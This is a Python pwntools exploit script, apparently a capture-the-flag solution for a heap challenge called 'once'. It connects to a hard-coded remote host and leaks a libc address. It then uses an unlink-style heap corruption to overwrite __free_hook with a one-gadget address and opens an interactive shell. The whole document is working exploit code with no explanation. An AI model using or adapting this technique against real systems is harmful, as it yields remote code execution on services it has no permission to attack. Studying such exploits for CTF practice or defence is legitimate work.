from pwn import *

#r = process(["./once"])
r = remote("47.75.189.102", 9999)
def alloca():
	r.sendafter(">","1"+"\x00"*7)

def read_once(content):
	r.sendafter(">","2"+"\x00"*7)
	r.send(content)

def unlink():
	r.sendafter(">","3"+"\x00"*7)




r.sendlineafter(">","10")
r.recvline()
libc = int(r.recvn(14),16)-0x6f690
print hex(libc)

r.sendafter(">","4"+"\x00"*7)
r.sendafter(">","1"+"\x00"*7)
r.sendafter(":",str(0x100)+"\x00"*5)
r.sendafter(">","4"+"\x00"*7)


read_once("a"*0x18+"\x50")
alloca()
unlink()


stdin = libc+0x3c48e0
free_hook = libc+0x3c67a8
one_get = libc+0x4526a
read_once(p64(stdin)*3+p64(free_hook))
r.sendafter(">","4"+"\x00"*7)
r.sendafter(">","2"+"\x00"*7)
r.send(p64(one_get))

r.interactive()
